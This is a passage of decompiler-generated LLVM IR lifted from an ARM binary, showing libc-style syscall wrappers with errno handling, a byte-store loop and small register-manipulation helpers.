  br i1 %v5_c04c, label %dec_label_pc_c040.dec_label_pc_c058.loopexit_crit_edge, label %dec_label_pc_c018

dec_label_pc_c018:                                ; preds = %dec_label_pc_c040
  %v7_c04c = inttoptr i32 %v6_c040 to i32*
  %v8_c04c = load i32, i32* @r1, align 4
  store i32 %v8_c04c, i32* %v7_c04c, align 4
  %v9_c04c = add i32 %v0_c02054, 28
  %v10_c04c = inttoptr i32 %v9_c04c to i32*
  %v11_c04c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_c04c, i32* %v10_c04c, align 4
  %v12_c04c = add i32 %v0_c02054, 32
  store i32 %v12_c04c, i32* @r3, align 4
  %v6_c050 = load i32, i32* %r2.global-to-local, align 4
  %v7_c050 = add i32 %v6_c050, -8
  store i32 %v7_c050, i32* %r2.global-to-local, align 4
  %v5_c01c = icmp slt i32 %v7_c050, 8
  br i1 %v5_c01c, label %dec_label_pc_c018.dec_label_pc_c058.loopexit_crit_edge, label %dec_label_pc_c018.dec_label_pc_c020_crit_edge

dec_label_pc_c018.dec_label_pc_c020_crit_edge:    ; preds = %dec_label_pc_c018
  %v2_c020.pre = load i32, i32* @r1, align 4
  %v1_c020 = inttoptr i32 %v12_c04c to i32*
  store i32 %v2_c020.pre, i32* %v1_c020, align 4
  %v3_c020 = add i32 %v0_c02054, 36
  %v4_c020 = inttoptr i32 %v3_c020 to i32*
  %v5_c020 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_c020, i32* %v4_c020, align 4
  %v6_c020 = add i32 %v0_c02054, 40
  store i32 %v6_c020, i32* @r3, align 4
  %v0_c024 = load i32, i32* %r2.global-to-local, align 4
  %v1_c024 = add i32 %v0_c024, -8
  store i32 %v1_c024, i32* %r2.global-to-local, align 4
  %v5_c02c = icmp slt i32 %v1_c024, 8
  br i1 %v5_c02c, label %dec_label_pc_c020.dec_label_pc_c058.loopexit_crit_edge, label %dec_label_pc_c030

dec_label_pc_c018.dec_label_pc_c058.loopexit_crit_edge: ; preds = %dec_label_pc_c018
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c058

dec_label_pc_c020.dec_label_pc_c058.loopexit_crit_edge: ; preds = %dec_label_pc_c018.dec_label_pc_c020_crit_edge, %dec_label_pc_c020.preheader
  %v1_c024.lcssa = phi i32 [ %v1_c02452, %dec_label_pc_c020.preheader ], [ %v1_c024, %dec_label_pc_c018.dec_label_pc_c020_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c058

dec_label_pc_c030.dec_label_pc_c058.loopexit_crit_edge: ; preds = %dec_label_pc_c030
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c058

dec_label_pc_c040.dec_label_pc_c058.loopexit_crit_edge: ; preds = %dec_label_pc_c040
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c058

dec_label_pc_c058:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c018.dec_label_pc_c058.loopexit_crit_edge, %dec_label_pc_c020.dec_label_pc_c058.loopexit_crit_edge, %dec_label_pc_c030.dec_label_pc_c058.loopexit_crit_edge, %dec_label_pc_c040.dec_label_pc_c058.loopexit_crit_edge, %dec_label_pc_bff0
  %v0_c060 = phi i32 [ %arg3, %dec_label_pc_bff0 ], [ %v1_c044, %dec_label_pc_c040.dec_label_pc_c058.loopexit_crit_edge ], [ %v1_c034, %dec_label_pc_c030.dec_label_pc_c058.loopexit_crit_edge ], [ %v1_c024.lcssa, %dec_label_pc_c020.dec_label_pc_c058.loopexit_crit_edge ], [ %v7_c050, %dec_label_pc_c018.dec_label_pc_c058.loopexit_crit_edge ], [ %v0_c018.pr, %dec_label_pc_c014 ]
  %v2_c058 = icmp eq i32 %v0_c060, 0
  store i1 %v2_c058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c058, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_c058
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_c058
  %v1_c060 = sub i32 7, %v0_c060
  store i32 %v1_c060, i32* %r2.global-to-local, align 4
  %v3_c064 = mul i32 %v1_c060, 4
  %v4_c064 = add i32 %v3_c064, ptrtoint (i32* @global_var_c06c.248 to i32)
  call void @__pseudo_branch(i32 %v4_c064)
  %v0_c06c = load i32, i32* @r1, align 4
  %v1_c06c = trunc i32 %v0_c06c to i8
  %v2_c06c = load i32, i32* @r3, align 4
  %v3_c06c = inttoptr i32 %v2_c06c to i8*
  store i8 %v1_c06c, i8* %v3_c06c, align 1
  %v4_c06c = load i32, i32* @r3, align 4
  %v5_c06c = add i32 %v4_c06c, 1
  store i32 %v5_c06c, i32* %r3.global-to-local, align 4
  %v0_c070 = load i32, i32* @r1, align 4
  %v1_c070 = trunc i32 %v0_c070 to i8
  %v3_c070 = inttoptr i32 %v5_c06c to i8*
  store i8 %v1_c070, i8* %v3_c070, align 1
  %v4_c070 = load i32, i32* %r3.global-to-local, align 4
  %v5_c070 = add i32 %v4_c070, 1
  store i32 %v5_c070, i32* %r3.global-to-local, align 4
  %v0_c074 = load i32, i32* @r1, align 4
  %v1_c074 = trunc i32 %v0_c074 to i8
  %v3_c074 = inttoptr i32 %v5_c070 to i8*
  store i8 %v1_c074, i8* %v3_c074, align 1
  %v4_c074 = load i32, i32* %r3.global-to-local, align 4
  %v5_c074 = add i32 %v4_c074, 1
  store i32 %v5_c074, i32* %r3.global-to-local, align 4
  %v0_c078 = load i32, i32* @r1, align 4
  %v1_c078 = trunc i32 %v0_c078 to i8
  %v3_c078 = inttoptr i32 %v5_c074 to i8*
  store i8 %v1_c078, i8* %v3_c078, align 1
  %v4_c078 = load i32, i32* %r3.global-to-local, align 4
  %v5_c078 = add i32 %v4_c078, 1
  store i32 %v5_c078, i32* %r3.global-to-local, align 4
  %v0_c07c = load i32, i32* @r1, align 4
  %v1_c07c = trunc i32 %v0_c07c to i8
  %v3_c07c = inttoptr i32 %v5_c078 to i8*
  store i8 %v1_c07c, i8* %v3_c07c, align 1
  %v4_c07c = load i32, i32* %r3.global-to-local, align 4
  %v5_c07c = add i32 %v4_c07c, 1
  store i32 %v5_c07c, i32* %r3.global-to-local, align 4
  %v0_c080 = load i32, i32* @r1, align 4
  %v1_c080 = trunc i32 %v0_c080 to i8
  %v3_c080 = inttoptr i32 %v5_c07c to i8*
  store i8 %v1_c080, i8* %v3_c080, align 1
  %v4_c080 = load i32, i32* %r3.global-to-local, align 4
  %v5_c080 = add i32 %v4_c080, 1
  store i32 %v5_c080, i32* %r3.global-to-local, align 4
  %v0_c084 = load i32, i32* @r1, align 4
  %v1_c084 = trunc i32 %v0_c084 to i8
  %v3_c084 = inttoptr i32 %v5_c080 to i8*
  store i8 %v1_c084, i8* %v3_c084, align 1
  %v4_c084 = load i32, i32* %r3.global-to-local, align 4
  %v5_c084 = add i32 %v4_c084, 1
  store i32 %v5_c084, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_c020, { 1, 0 }
  uselistorder i32 %v12_c04c, { 1, 2, 0 }
  uselistorder i32 %v0_c02054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_c018.pr, { 0, 2, 1 }
  uselistorder i32 %v6_c008, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_bffc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 5, 4, 3, 1, 9, 8, 0, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_c058, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_c090() local_unnamed_addr {
dec_label_pc_c090:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c090 = load i32, i32* @r7, align 4
  store i32 %v3_c090, i32* %stack_var_-8, align 4
  %v0_c09c = load i32, i32* @r0, align 4
  store i32 %v0_c09c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c09c, -4095
  br i1 %tmp, label %dec_label_pc_c0c4, label %dec_label_pc_c0ac

dec_label_pc_c0ac:                                ; preds = %dec_label_pc_c090
  %v0_c0b0 = call i32 @function_f150()
  %v3_c0b4 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c0b4 = sext i16 %v3_c0b4 to i32
  %v0_c0b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0b8 = sub i32 0, %v0_c0b8
  store i32 %v1_c0b8, i32* %r2.global-to-local, align 4
  %v3_c0bc = add i32 %v4_c0b4, %v0_c0b0
  %v4_c0bc = inttoptr i32 %v3_c0bc to i32*
  store i32 %v1_c0b8, i32* %v4_c0bc, align 4
  %v2_c0c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c0c4

dec_label_pc_c0c4:                                ; preds = %dec_label_pc_c090, %dec_label_pc_c0ac
  %v1_c0c8 = phi i32 [ %v0_c09c, %dec_label_pc_c090 ], [ -1, %dec_label_pc_c0ac ]
  %v2_c0c4 = phi i32 [ %v3_c090, %dec_label_pc_c090 ], [ %v2_c0c4.pre, %dec_label_pc_c0ac ]
  store i32 %v2_c0c4, i32* @r7, align 4
  ret i32 %v1_c0c8

; uselistorder directives
  uselistorder i32 %v0_c09c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c0c4, { 1, 0 }
}

define i32 @function_c0cc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_c0cc:
  %v0_c0cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c0cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c0cc
  %v2_c0cc = load i32, i32* @sp, align 4
  %v8_c0cc = shl i32 %v2_c0cc, %arg2
  %v9_c0cc = and i32 %v8_c0cc, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c0cc, %bb
  %v10_c0d0 = phi i32 [ %arg1, %dec_label_pc_c0cc ], [ %v9_c0cc, %bb ]
  ret i32 %v10_c0d0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c0d4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c0d4:
  store i32 %arg1, i32* @r0, align 4
  %v3_c0d8 = load i32, i32* @r4, align 4
  %v9_c0d8 = load i32, i32* @r6, align 4
  %v12_c0d8 = load i32, i32* @r7, align 4
  %v4_c0e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 12468) to i32*), align 4
  %v2_c0e8 = icmp eq i32 %v4_c0e4, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_c0e8, label %dec_label_pc_c100, label %dec_label_pc_c0d4.dec_label_pc_c10c_crit_edge

dec_label_pc_c0d4.dec_label_pc_c10c_crit_edge:    ; preds = %dec_label_pc_c0d4
  br label %dec_label_pc_c10c

dec_label_pc_c100:                                ; preds = %dec_label_pc_c0d4
  store i32 %v3_c0d8, i32* @r4, align 4
  store i32 %v9_c0d8, i32* @r6, align 4
  store i32 %v12_c0d8, i32* @r7, align 4
  %v0_c108 = call i32 @function_c090()
  br label %dec_label_pc_c10c

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c0d4.dec_label_pc_c10c_crit_edge, %dec_label_pc_c100
  %v0_c10c = call i32 @function_e9c8()
  store i32 %v0_c10c, i32* @r5, align 4
  %v0_c11c = load i32, i32* @r4, align 4
  store i32 %v0_c11c, i32* @r0, align 4
  %v0_c120 = call i32 @function_c090()
  store i32 %v0_c120, i32* @r4, align 4
  %v0_c128 = load i32, i32* @r5, align 4
  %v1_c12c = call i32 @function_e940(i32 %v0_c128)
  %v0_c130 = load i32, i32* @r4, align 4
  store i32 %v12_c0d8, i32* @r7, align 4
  ret i32 %v0_c130

; uselistorder directives
  uselistorder label %dec_label_pc_c10c, { 1, 0 }
}

define i32 @function_c148(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_c148:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c148 = load i32, i32* @r7, align 4
  store i32 %v3_c148, i32* %stack_var_-8, align 4
  %v0_c154 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_c154, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c154, -4095
  br i1 %tmp, label %dec_label_pc_c17c, label %dec_label_pc_c164

dec_label_pc_c164:                                ; preds = %dec_label_pc_c148
  %v0_c168 = call i32 @function_f150()
  %v3_c16c = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c16c = sext i16 %v3_c16c to i32
  %v0_c170 = load i32, i32* %r2.global-to-local, align 4
  %v1_c170 = sub i32 0, %v0_c170
  store i32 %v1_c170, i32* %r2.global-to-local, align 4
  %v3_c174 = add i32 %v4_c16c, %v0_c168
  %v4_c174 = inttoptr i32 %v3_c174 to i32*
  store i32 %v1_c170, i32* %v4_c174, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_c17c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c17c

dec_label_pc_c17c:                                ; preds = %dec_label_pc_c148, %dec_label_pc_c164
  %v1_c180 = phi i32 [ %v0_c154, %dec_label_pc_c148 ], [ -1, %dec_label_pc_c164 ]
  %v2_c17c = phi i32 [ %v3_c148, %dec_label_pc_c148 ], [ %v2_c17c.pre, %dec_label_pc_c164 ]
  store i32 %v2_c17c, i32* @r7, align 4
  ret i32 %v1_c180

; uselistorder directives
  uselistorder i32 %v0_c154, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c17c, { 1, 0 }
}

define i32 @function_c184(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c184:
  %v0_c184 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c184, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c184
  %v2_c184 = load i32, i32* @sl, align 4
  %v8_c184 = shl i32 %v2_c184, %arg2
  %v9_c184 = and i32 %v8_c184, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c184, %bb
  %v9_c188 = phi i32 [ %arg1, %dec_label_pc_c184 ], [ %v9_c184, %bb ]
  ret i32 %v9_c188

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c18c() local_unnamed_addr {
dec_label_pc_c18c:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c18c = load i32, i32* @r7, align 4
  store i32 %v3_c18c, i32* %stack_var_-8, align 4
  %v0_c198 = load i32, i32* @r0, align 4
  store i32 %v0_c198, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c198, -4095
  br i1 %tmp, label %dec_label_pc_c1c0, label %dec_label_pc_c1a8

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c18c
  %v0_c1ac = call i32 @function_f150()
  %v3_c1b0 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c1b0 = sext i16 %v3_c1b0 to i32
  %v0_c1b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c1b4 = sub i32 0, %v0_c1b4
  store i32 %v1_c1b4, i32* %r2.global-to-local, align 4
  %v3_c1b8 = add i32 %v4_c1b0, %v0_c1ac
  %v4_c1b8 = inttoptr i32 %v3_c1b8 to i32*
  store i32 %v1_c1b4, i32* %v4_c1b8, align 4
  %v2_c1c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c1c0

dec_label_pc_c1c0:                                ; preds = %dec_label_pc_c18c, %dec_label_pc_c1a8
  %v1_c1c4 = phi i32 [ %v0_c198, %dec_label_pc_c18c ], [ -1, %dec_label_pc_c1a8 ]
  %v2_c1c0 = phi i32 [ %v3_c18c, %dec_label_pc_c18c ], [ %v2_c1c0.pre, %dec_label_pc_c1a8 ]
  store i32 %v2_c1c0, i32* @r7, align 4
  ret i32 %v1_c1c4

; uselistorder directives
  uselistorder i32 %v0_c198, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c1c0, { 1, 0 }
}

define i32 @function_c1c8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c1c8:
  %v0_c1c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c1c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c1c8
  %v2_c1c8 = load i32, i32* @fp, align 4
  %v8_c1c8 = shl i32 %v2_c1c8, %arg2
  %v9_c1c8 = and i32 %v8_c1c8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c1c8, %bb
  %v7_c1cc = phi i32 [ %arg1, %dec_label_pc_c1c8 ], [ %v9_c1c8, %bb ]
  ret i32 %v7_c1cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c1d0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_c1d0:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c1d4 = load i32, i32* @r4, align 4
  store i32 %v3_c1d4, i32* %stack_var_-20, align 4
  %v6_c1d4 = load i32, i32* @r5, align 4
  %v9_c1d4 = load i32, i32* @r6, align 4
  %v12_c1d4 = load i32, i32* @r7, align 4
  %v4_c1e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 12468) to i32*), align 4
  %v2_c1e4 = icmp eq i32 %v4_c1e0, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_c1e4, label %dec_label_pc_c1fc, label %dec_label_pc_c1d0.dec_label_pc_c208_crit_edge

dec_label_pc_c1d0.dec_label_pc_c208_crit_edge:    ; preds = %dec_label_pc_c1d0
  br label %dec_label_pc_c208

dec_label_pc_c1fc:                                ; preds = %dec_label_pc_c1d0
  store i32 %v3_c1d4, i32* @r4, align 4
  store i32 %v9_c1d4, i32* @r6, align 4
  store i32 %v12_c1d4, i32* @r7, align 4
  %v0_c204 = call i32 @function_c18c()
  br label %dec_label_pc_c208

dec_label_pc_c208:                                ; preds = %dec_label_pc_c1d0.dec_label_pc_c208_crit_edge, %dec_label_pc_c1fc
  %v0_c208 = call i32 @function_e9c8()
  %v0_c20c = load i32, i32* @r6, align 4
  store i32 %v0_c20c, i32* @r1, align 4
  store i32 %v0_c208, i32* @r5, align 4
  %v0_c218 = load i32, i32* @r4, align 4
  store i32 %v0_c218, i32* @r0, align 4
  %v0_c21c = call i32 @function_c18c()
  store i32 %v0_c21c, i32* @r4, align 4
  %v0_c224 = load i32, i32* @r5, align 4
  %v1_c228 = call i32 @function_e940(i32 %v0_c224)
  %v0_c22c = load i32, i32* @r4, align 4
  %v2_c234 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c234, i32* @r4, align 4
  store i32 %v6_c1d4, i32* @r5, align 4
  store i32 %v9_c1d4, i32* @r6, align 4
  store i32 %v12_c1d4, i32* @r7, align 4
  ret i32 %v0_c22c

; uselistorder directives
  uselistorder label %dec_label_pc_c208, { 1, 0 }
}

define i32 @function_c244(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_c244:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c244 = load i32, i32* @r7, align 4
  store i32 %v3_c244, i32* %stack_var_-8, align 4
  %v0_c250 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_c250, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c250, -4095
  br i1 %tmp, label %dec_label_pc_c278, label %dec_label_pc_c260

dec_label_pc_c260:                                ; preds = %dec_label_pc_c244
  %v0_c264 = call i32 @function_f150()
  %v3_c268 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c268 = sext i16 %v3_c268 to i32
  %v0_c26c = load i32, i32* %r2.global-to-local, align 4
  %v1_c26c = sub i32 0, %v0_c26c
  store i32 %v1_c26c, i32* %r2.global-to-local, align 4
  %v3_c270 = add i32 %v4_c268, %v0_c264
  %v4_c270 = inttoptr i32 %v3_c270 to i32*
  store i32 %v1_c26c, i32* %v4_c270, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_c278.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c278

dec_label_pc_c278:                                ; preds = %dec_label_pc_c244, %dec_label_pc_c260
  %v1_c27c = phi i32 [ %v0_c250, %dec_label_pc_c244 ], [ -1, %dec_label_pc_c260 ]
  %v2_c278 = phi i32 [ %v3_c244, %dec_label_pc_c244 ], [ %v2_c278.pre, %dec_label_pc_c260 ]
  store i32 %v2_c278, i32* @r7, align 4
  ret i32 %v1_c27c

; uselistorder directives
  uselistorder i32 %v0_c250, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c278, { 1, 0 }
}

define i32 @function_c280(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c280:
  %v0_c280 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c280, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c280
  %v2_c280 = load i32, i32* @lr, align 4
  %v8_c280 = shl i32 %v2_c280, %arg2
  %v9_c280 = and i32 %v8_c280, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c280, %bb
  %v5_c284 = phi i32 [ %arg1, %dec_label_pc_c280 ], [ %v9_c280, %bb ]
  ret i32 %v5_c284

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c288(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_c288:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_c288 = load i32, i32* @r4, align 4
  store i32 %v3_c288, i32* %stack_var_-12, align 4
  %v0_c298 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_c298, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c298, -4095
  br i1 %tmp, label %dec_label_pc_c2c0, label %dec_label_pc_c2a8

dec_label_pc_c2a8:                                ; preds = %dec_label_pc_c288
  %v0_c2ac = call i32 @function_f150()
  %v3_c2b0 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c2b0 = sext i16 %v3_c2b0 to i32
  store i32 %v4_c2b0, i32* @r3, align 4
  %v0_c2b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c2b4 = sub i32 0, %v0_c2b4
  store i32 %v1_c2b4, i32* %r2.global-to-local, align 4
  %v3_c2b8 = add i32 %v4_c2b0, %v0_c2ac
  %v4_c2b8 = inttoptr i32 %v3_c2b8 to i32*
  store i32 %v1_c2b4, i32* %v4_c2b8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_c2c0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_c2c0

dec_label_pc_c2c0:                                ; preds = %dec_label_pc_c288, %dec_label_pc_c2a8
  %v1_c2c4 = phi i32 [ %v0_c298, %dec_label_pc_c288 ], [ -1, %dec_label_pc_c2a8 ]
  %v2_c2c0 = phi i32 [ %v3_c288, %dec_label_pc_c288 ], [ %v2_c2c0.pre, %dec_label_pc_c2a8 ]
  store i32 %v2_c2c0, i32* @r4, align 4
  ret i32 %v1_c2c4

; uselistorder directives
  uselistorder i32 %v0_c298, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c2c0, { 1, 0 }
}

define i32 @function_c2c8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c2c8:
  %v0_c2c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c2c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c2c8
  %v2_c2c8 = load i32, i32* @r7, align 4
  %v5_c2c8 = udiv i32 %v2_c2c8, 4
  %v6_c2c8 = and i32 %v5_c2c8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c2c8, %bb
  %v4_c2cc = phi i32 [ %arg1, %dec_label_pc_c2c8 ], [ %v6_c2c8, %bb ]
  ret i32 %v4_c2cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c2d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c2d0:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_c304, label %dec_label_pc_c2ec

dec_label_pc_c2ec:                                ; preds = %dec_label_pc_c2d0
  %v0_c2f0 = call i32 @function_f150()
  %v3_c2f4 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c2f4 = sext i16 %v3_c2f4 to i32
  %v0_c2f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_c2f8 = sub i32 0, %v0_c2f8
  store i32 %v1_c2f8, i32* %r2.global-to-local, align 4
  %v3_c2fc = add i32 %v4_c2f4, %v0_c2f0
  %v4_c2fc = inttoptr i32 %v3_c2fc to i32*
  store i32 %v1_c2f8, i32* %v4_c2fc, align 4
  br label %dec_label_pc_c304

dec_label_pc_c304:                                ; preds = %dec_label_pc_c2d0, %dec_label_pc_c2ec
  %v1_c308 = phi i32 [ %arg1, %dec_label_pc_c2d0 ], [ -1, %dec_label_pc_c2ec ]
  ret i32 %v1_c308

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_c304, { 1, 0 }
}

define i32 @function_c310() local_unnamed_addr {
dec_label_pc_c310:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c310 = load i32, i32* @r7, align 4
  store i32 %v3_c310, i32* %stack_var_-8, align 4
  %v0_c31c = load i32, i32* @r0, align 4
  store i32 %v0_c31c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c31c, -4095
  br i1 %tmp, label %dec_label_pc_c344, label %dec_label_pc_c32c

dec_label_pc_c32c:                                ; preds = %dec_label_pc_c310
  %v0_c330 = call i32 @function_f150()
  %v3_c334 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_c334 = sext i16 %v3_c334 to i32
  %v0_c338 = load i32, i32* %r2.global-to-local, align 4
  %v1_c338 = sub i32 0, %v0_c338
  store i32 %v1_c338, i32* %r2.global-to-local, align 4
  %v3_c33c = add i32 %v4_c334, %v0_c330
  %v4_c33c = inttoptr i32 %v3_c33c to i32*
  store i32 %v1_c338, i32* %v4_c33c, align 4
  %v2_c344.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c344

dec_label_pc_c344:                                ; preds = %dec_label_pc_c310, %dec_label_pc_c32c
  %v1_c348 = phi i32 [ %v0_c31c, %dec_label_pc_c310 ], [ -1, %dec_label_pc_c32c ]
  %v2_c344 = phi i32 [ %v3_c310, %dec_label_pc_c310 ], [ %v2_c344.pre, %dec_label_pc_c32c ]
  store i32 %v2_c344, i32* @r7, align 4
  ret i32 %v1_c348

; uselistorder directives
  uselistorder i32 %v0_c31c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c344, { 1, 0 }
}

define i32 @function_c34c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c34c:
  %v0_c34c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c34c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c34c
  %v5_c34c = udiv i32 %arg2, 4
  %v6_c34c = and i32 %v5_c34c, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c34c, %bb
  %v3_c350 = phi i32 [ %arg1, %dec_label_pc_c34c ], [ %v6_c34c, %bb ]
  ret i32 %v3_c350

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c354(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c354:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_c358 = load i32, i32* @r4, align 4
  store i32 %v3_c358, i32* %stack_var_-24, align 4
  %v6_c358 = load i32, i32* @r5, align 4
  %v9_c358 = load i32, i32* @r6, align 4
  %v12_c358 = load i32, i32* @r7, align 4
  %v15_c358 = load i32, i32* @r8, align 4
  %v18_c358 = load i32, i32* @lr, align 4
